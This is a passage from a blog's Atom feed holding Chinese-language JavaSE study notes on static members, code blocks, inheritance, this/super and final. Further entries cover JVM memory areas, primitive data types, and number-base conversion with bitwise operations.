    <content type="html"><![CDATA[<h1 id="一、静态方法与静态变量"><a href="#一、静态方法与静态变量" class="headerlink" title="一、静态方法与静态变量"></a>一、静态方法与静态变量</h1><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><ul><li>如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象</li></ul><h2 id="如何防止创建本类对象？"><a href="#如何防止创建本类对象？" class="headerlink" title="如何防止创建本类对象？"></a>如何防止创建本类对象？</h2><ul><li><p>可以直接私有构造方法<br>  <code>private 类名（）{}</code></p><a id="more"></a><h2 id="如何创建一个静态方法？"><a href="#如何创建一个静态方法？" class="headerlink" title="如何创建一个静态方法？"></a>如何创建一个静态方法？</h2></li><li><p>在方法中加<code>static</code>修饰，那么这个方法是静态方法（函数）</p><blockquote><p>在载入类的时候就这个方法就已经在类的<code>静态区</code>创建，不需要创建对象即可调用</p></blockquote></li></ul><h2 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h2><ul><li>在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。<blockquote><p>比如</p><p>第一条命令给这个变量赋值“<code>张三</code>”</p><p>第二条命令又给这个变量赋值“<code>李四</code>”</p><p>那么之后调用这个变量时，这个变量返回“<code>李四</code>”</p></blockquote></li></ul><h1 id="二、构造方法-与-代码块"><a href="#二、构造方法-与-代码块" class="headerlink" title="二、构造方法 与 代码块"></a>二、构造方法 与 代码块</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li><p>构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果</p><blockquote><p>系统会自动创建<code>空参构造</code>，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出</p></blockquote></li></ul><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><h4 id="局部代码块"><a href="#局部代码块" class="headerlink" title="局部代码块"></a>局部代码块</h4><ul><li>它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率</li></ul><h4 id="构造代码块-初始化块"><a href="#构造代码块-初始化块" class="headerlink" title="构造代码块 (初始化块)"></a>构造代码块 (初始化块)</h4><ul><li>构造代码块可以在一个类中执行，执行完就弹栈，</li><li><p>例：</p>  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deom</span></span>&#123;&#123;这就是构造代码块&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行</p></blockquote></li><li><p>构造代码块可以把一些<code>初始化的代码</code>放在其中，<code>每次调用构造都执行</code>，并且<code>在构造方法之前执行</code></p><blockquote><p>ps：实际上构造方法开发中用到的不多，但是面试可能会问</p></blockquote></li></ul><ul><li>构造代码块可以做的功能：<blockquote><p>我们可以做诸如统计创建对象的次数等功能。</p></blockquote></li></ul><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><ul><li><p>例：</p>  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>作用：</p><blockquote><p>用于给类进行初始化，在<code>加载的时候就执行</code>，并且<code>只执行一次</code>。</p><p>一般用于<code>加载驱动</code>，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。</p><p>比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。</p></blockquote></li><li><p><code>注意事项：</code></p><blockquote><p>1、静态代码块不能访问普通变量</p><p>2、静态代码块在 <code>类</code> 中，<code>优先于主方法</code>（<code>面试题</code>）</p><p>3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块</p></blockquote></li></ul><h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><blockquote><p>ps：继承与升级一般都用作系统升级</p><p><code>父类 &gt; 子类</code></p></blockquote><ul><li><p>继承的定义</p><blockquote><p><code>class 子类(当前类) extends 父类(继承的类)</code></p><p>ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法</p></blockquote></li><li><p>继承的好处：</p><blockquote><p>1、可以提升代码的复用性，不需要打太多重复的代码</p><p>2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错</p><p>3、是多态的前提</p></blockquote></li><li><p>继承的弊端：</p><blockquote><p>1、耦合性非常强，父类有的一些属性可能是子类不需要的</p></blockquote></li><li><p>开发原则：</p><blockquote><p><code>高内聚、低耦合</code></p><p>耦合：类与类的关系</p><p>内聚：自己完成某件事的能力</p></blockquote></li><li><p>在java中继承的特点：</p><blockquote><p>1、Java<code>只支持单继承</code>不支持多继承（一个孩子只能有一个爹）</p><p>2、<code>可以多层继承</code>（继承体系），也就是可以继承爷爷</p><p>3、想看这个体系<code>所有功能</code>就看最底层类，也就是儿子类</p><p>4、想看这个体系<code>共性功能</code>就要看顶层类，也就是爷爷类</p></blockquote></li><li><p>注意事项</p><blockquote><p>1、子类只能继承父类所有<code>非私有</code>的成员（方法和变量）</p><p>2、<code>子类不能继承父类的构造方法</code>，因为构造方法必须和类名一样，而继承是不一样的，但可以通过<code>super</code>关键字去访问父类的构造方法</p><p>3、<code>不要为了部分功能而去继承</code>，因为<code>继承体现的是一种关系</code>，就算有相同属性也不一定继承。</p><p>比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。</p><p>4、<code>子父类如果出现相同变量那么会采取就近原则</code>，但是在真正的项目开发中不会出现这种情况，因为没有意义</p><p>5、子类<code>无论如何</code>都会访问父类中的<code>构造方法</code></p><p>6、<code>在全是静态方法的类中，构造方法必须私有化</code>，这样防止别人创建这个类的对象</p></blockquote></li></ul><h4 id="this和super"><a href="#this和super" class="headerlink" title="this和super"></a>this和super</h4><ul><li>this：<blockquote><p>代表<code>当前对象的引用</code>，如果继承了父类，那么也可以引用父类</p></blockquote></li><li>super：<blockquote><p>代表<code>对父类的引用</code></p></blockquote></li></ul><ul><li><p>一些使用实例：</p><ul><li>this.成员变量名<blockquote><p>调用本类成员变量，也可以调用父类的，但是<code>采用就近原则</code></p></blockquote></li><li><p>super.成员变量名</p><blockquote><p>调用父类的成员变量</p></blockquote><p>ps：成员变量名可以是方法名</p></li><li><p>调用父类中的构造方法:</p>  <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">super</span>(<span class="params">...</span>)</span>;</span><br></pre></td></tr></table></figure></li><li><p>调用本类中的构造方法:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">this</span>(<span class="params">...</span>)</span>;</span><br></pre></td></tr></table></figure><p>ps：一个方法里只能调用其中的一个</p></li></ul></li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>类中的构造方法系统都自带<code>super()；</code>但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以<code>super（参数1，参数2....）；</code>也可以用this调用本类的有参构造，进而间接调用父类有参构造</p></li><li><p><code>构造方法</code>的调用都是从上到下，即<code>从父类调用到子类</code>，可以理解为一个队列</p></li><li><p>继承中的面试</p><blockquote><p>1、假设有  <code>子类方法、子类、父类</code> 且其中都有一个num的变量，那么：<code>num</code>用方法中的变量，<code>this.num</code>调用本类中的变量，<code>super.num</code>调用父类中的变量</p><p>2、在继承中不要忘记了<code>每个构造方法都会有一个super（）；访问父类</code></p><p>3、override   重写：<code>子类中</code>出现了和<code>父类中方法声明一模一样的方法</code>。与返回值类型有关,返<code>回值类型是一致的</code></p><p>4、overload  重载：<code>本类中</code>出现的<code>方法名一样</code>，<code>参数列表不同</code>的方法。<code>与返回值类型无关</code>。</p></blockquote></li><li><p>继承中的成员方法关系</p><blockquote><p>、子、父类有相同方法并且返回值类型也一样，那么会<code>调用子类的方法</code>，也叫<code>方法重写</code></p></blockquote></li></ul><ul><li>final概述<ul><li>它可以用来修饰 <code>类与变量</code> 修饰之后表示它是<code>“最终的”</code>不能被继续操作了</li></ul></li></ul><ul><li>final修饰特点<ul><li>修饰类，类不能被继承</li><li>修饰变量：<code>变量</code>就变成了<code>常量</code>，<code>只能被赋值一次</code>，通常与<code>public static</code>配套使用</li><li>修饰方法：方法<code>不能被重写</code>，表示最终方法。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、静态方法与静态变量&quot;&gt;&lt;a href=&quot;#一、静态方法与静态变量&quot; class=&quot;headerlink&quot; title=&quot;一、静态方法与静态变量&quot;&gt;&lt;/a&gt;一、静态方法与静态变量&lt;/h1&gt;&lt;h2 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;headerlink&quot; title=&quot;静态方法&quot;&gt;&lt;/a&gt;静态方法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;如何防止创建本类对象？&quot;&gt;&lt;a href=&quot;#如何防止创建本类对象？&quot; class=&quot;headerlink&quot; title=&quot;如何防止创建本类对象？&quot;&gt;&lt;/a&gt;如何防止创建本类对象？&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;可以直接私有构造方法&lt;br&gt;  &lt;code&gt;private 类名（）{}&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="代码块" scheme="http://liuhaoan.github.io/tags/%E4%BB%A3%E7%A0%81%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——java的五大内存区域</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94java%E7%9A%84%E4%BA%94%E5%A4%A7%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/</id>
    <published>2019-04-05T15:40:17.000Z</published>
    <updated>2019-04-08T12:27:31.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="五大内存区域"><a href="#五大内存区域" class="headerlink" title="五大内存区域"></a>五大内存区域</h1><ul><li>堆</li><li>虚拟机栈</li><li>本地方法栈</li><li>方法区</li><li><p>寄存器区</p><blockquote><p>ps：我们主要用：虚拟机栈、方法区、堆</p></blockquote></li></ul><a id="more"></a><h1 id="Java程序运行过程"><a href="#Java程序运行过程" class="headerlink" title="Java程序运行过程"></a>Java程序运行过程</h1><ul><li>1、加载字节码文件到方法区（.class文件）</li><li>2、程序代码依次进栈（jvm执行main方法）</li></ul><h1 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h1><blockquote><p>最大的一块内存，存放对象实例的地方</p><ul><li>1、Java堆是垃圾收集器管理的主要区域，也称GC堆。</li><li>2、Java堆物理上可不连续，逻辑上连续。</li><li>3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常</li></ul></blockquote><h1 id="虚拟机栈（stack）："><a href="#虚拟机栈（stack）：" class="headerlink" title="虚拟机栈（stack）："></a>虚拟机栈（stack）：</h1><blockquote><p>java方法执行时的内存模型</p></blockquote><ul><li>栈帧<blockquote><p>1、<code>每个方法</code>都会在虚拟机栈中创建一个对应的栈帧，用于存储<code>局部变量表</code>，<code>操作数栈</code>，<code>动态链接</code>，<code>方法出口</code>等信息。</p><p>2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈<code>入栈到出栈</code>。</p></blockquote></li></ul><ul><li>局部变量表<blockquote><p>1、存放编译期可知在方法中各种<code>基本数据类型</code>和<code>对象</code>的引用，基本数据类型直接存值, 引用数据类型存地址。</p></blockquote></li></ul><p>#本地方法栈：</p><blockquote><p>本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务</p></blockquote><ul><li><p><code>本地方法</code> 关键字 <code>native</code> ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。</p></li><li><p>有的虚拟机将<code>本地方法栈</code>和<code>虚拟机栈</code>合在一起，如<code>HotSpot</code>。</p></li></ul><h1 id="方法区："><a href="#方法区：" class="headerlink" title="方法区："></a>方法区：</h1><ul><li>存已经被虚拟机加载的类信息（Class对象）、<code>常量</code>、<code>静态变量</code>、即时编译器JIT编译过后的<code>代码数据</code>。</li><li><p>jdk <code>1.7</code>、1.8 对方法区做出了修改，1.8 取消了方法区。</p><blockquote><p>1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap</p><p>2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。</p><p>3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。</p></blockquote></li><li><p>运行时常量池</p><blockquote><p>1、在方法区，用来存放编译期生成的各种符号引用和字面量</p><p>2、编译期将各种<code>符号引用</code>和<code>字面量</code>放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时<code>复制</code>到局部变量表中。1.7开始字符串<code>常量池</code>被移入堆中。</p><p>符号引用： String ss = “asdsfg”  ss这个符号就是符号引用。解析阶段解析为直接引用</p><p>字面量： 值本身 如 asdfg</p><p>常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。</p></blockquote></li></ul><h1 id="寄存器（程序计数器）："><a href="#寄存器（程序计数器）：" class="headerlink" title="寄存器（程序计数器）："></a>寄存器（程序计数器）：</h1><ul><li>占用较小的一块内存空间，当执行Java方法时<code>记录正在执行的虚拟机字节码指令地址</code>，如果执行Native方法则计时器值为空。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;五大内存区域&quot;&gt;&lt;a href=&quot;#五大内存区域&quot; class=&quot;headerlink&quot; title=&quot;五大内存区域&quot;&gt;&lt;/a&gt;五大内存区域&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;堆&lt;/li&gt;
&lt;li&gt;虚拟机栈&lt;/li&gt;
&lt;li&gt;本地方法栈&lt;/li&gt;
&lt;li&gt;方法区&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器区&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ps：我们主要用：虚拟机栈、方法区、堆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="javaSE" scheme="http://liuhaoan.github.io/tags/javaSE/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——数据类型</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/</id>
    <published>2019-04-05T12:47:43.000Z</published>
    <updated>2019-04-08T11:51:09.510Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基本数据分为四大类"><a href="#基本数据分为四大类" class="headerlink" title="基本数据分为四大类"></a>基本数据分为四大类</h4><blockquote><p>重要：以后面试可能会问范围</p><p>注：通常在复制 long  float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D</p></blockquote><a id="more"></a><ul><li>整数型（整数常亮默认为int类型）<ul><li><code>byte</code>：占一个字节   <code>-128</code> ~ <code>127</code></li><li><code>short</code>：占两个字节   <code>-2^15</code> ~ <code>2^15-1</code></li><li><code>int</code>：占四个字节   <code>-2^31</code> ~ <code>2^31-1</code></li><li><code>long</code>：占八个字节   <code>-2^63</code> ~ <code>2^63-1</code></li></ul></li></ul><ul><li>浮点型（小数型，默认小数是double类型）<ul><li><code>float</code>：占<code>四个字节</code><blockquote><p>-2^128 ~ 2^128        绝对保证精度6位，但有7位有效数字</p></blockquote></li><li><code>double</code>：占<code>八个字节</code><blockquote><p>-2^1024 ~ 2^1024        绝对保证精度15位，但有16位有效数字</p></blockquote></li></ul></li></ul><ul><li>字符型<ul><li><code>char</code>：占两个字节   0 ~ 65535</li></ul></li></ul><ul><li>布尔型（判断）<ul><li><code>boolean</code>：理论<code>八分之一字节</code>，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小</li></ul></li></ul><blockquote><p>ps：<code>float</code>由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;基本数据分为四大类&quot;&gt;&lt;a href=&quot;#基本数据分为四大类&quot; class=&quot;headerlink&quot; title=&quot;基本数据分为四大类&quot;&gt;&lt;/a&gt;基本数据分为四大类&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;重要：以后面试可能会问范围&lt;/p&gt;
&lt;p&gt;注：通常在复制 long  float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="数据类型" scheme="http://liuhaoan.github.io/tags/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——进制编码</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/</id>
    <published>2019-04-05T12:27:44.000Z</published>
    <updated>2019-04-08T11:49:23.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进制的运算"><a href="#进制的运算" class="headerlink" title="进制的运算"></a>进制的运算</h2><ul><li><p>二进制向右移动两位 ：15 &gt;&gt; 2 = 3</p><ul><li>ps：1111 向右移动两位 等于 0011 = 3</li></ul></li><li><p>二进制向左移动两位 ：15 &lt;&lt; 2 = 60</p><ul><li>ps：1111 向左移动两位 等于 111100 = 60</li></ul></li><li><p>异或运算 ：2 ^ 3 = 1</p><ul><li>例子：0010 ^ 0011 = 0001<blockquote><p>ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样</p></blockquote></li></ul></li><li><p>与运算 ：2 &amp; 3 = 2</p><ul><li>例子：0010 &amp; 0011=0010<blockquote><p>“与”运算中也是二进制位的运算，只要有一个是0那么结果就是0</p><a id="more"></a></blockquote><h2 id="java中的数据表示法"><a href="#java中的数据表示法" class="headerlink" title="java中的数据表示法"></a>java中的数据表示法</h2></li></ul></li><li>在java中数据前面加  0x表示16进制   0b表示二进制   0表示8进制</li></ul><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><blockquote><p>任何进制转10进制都是    每一位  第某位的数据 乘 被转换的进制数 的 第某位索引次幂  相加</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="八转10："><a href="#八转10：" class="headerlink" title="八转10："></a>八转10：</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0120</span>=<span class="number">1</span> * <span class="number">8</span> ^ <span class="number">2</span> + <span class="number">2</span> * <span class="number">8</span> ^ <span class="number">1</span> + <span class="number">0</span> * <span class="number">8</span> ^ <span class="number">0</span> = <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>10进制转任何进制都是    除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上</p></blockquote><h4 id="2、8互转与2、16互转方法："><a href="#2、8互转与2、16互转方法：" class="headerlink" title="2、8互转与2、16互转方法："></a>2、8互转与2、16互转方法：</h4><blockquote><ul><li>2转8 = 3位一组转8<ul><li>8转2 = 每一位转2</li></ul></li><li>2转16 = 4位一组转16    <ul><li>16转2 = 每一位转2</li></ul></li></ul></blockquote><h4 id="二进制快速转换10进制方法："><a href="#二进制快速转换10进制方法：" class="headerlink" title="二进制快速转换10进制方法："></a>二进制快速转换10进制方法：</h4><blockquote><ul><li>二进制：<code>1    1    1    1    1    1    1    1</code></li><li>十进制：<code>128    64    32    16    8    4    2    1</code></li></ul></blockquote><h4 id="二进制表示法"><a href="#二进制表示法" class="headerlink" title="二进制表示法:"></a>二进制表示法:</h4><blockquote><p>符号位0为正，1为负</p></blockquote><h4 id="计算机二进制运算原理"><a href="#计算机二进制运算原理" class="headerlink" title="计算机二进制运算原理"></a>计算机二进制运算原理</h4><blockquote><p>计算机二进制运算都是用补码</p></blockquote><ul><li><p>例子：</p><blockquote><p>+7 的原码是 0 0000111</p></blockquote></li><li><p>ps：正数的、原码、反码、补码都一样</p></li></ul><blockquote><p>-7 的原码为 1 0000111</p><p>反码为 1 1111000 （符号位不变）</p><p>补码为 1 1111001（在反码的基础上加1）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;进制的运算&quot;&gt;&lt;a href=&quot;#进制的运算&quot; class=&quot;headerlink&quot; title=&quot;进制的运算&quot;&gt;&lt;/a&gt;进制的运算&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二进制向右移动两位 ：15 &amp;gt;&amp;gt; 2 = 3&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：1111 向右移动两位 等于 0011 = 3&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;二进制向左移动两位 ：15 &amp;lt;&amp;lt; 2 = 60&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：1111 向左移动两位 等于 111100 = 60&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;异或运算 ：2 ^ 3 = 1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例子：0010 ^ 0011 = 0001&lt;blockquote&gt;
&lt;p&gt;ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;与运算 ：2 &amp;amp; 3 = 2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例子：0010 &amp;amp; 0011=0010&lt;blockquote&gt;
&lt;p&gt;“与”运算中也是二进制位的运算，只要有一个是0那么结果就是0&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="进制编码" scheme="http://liuhaoan.github.io/tags/%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
</feed>
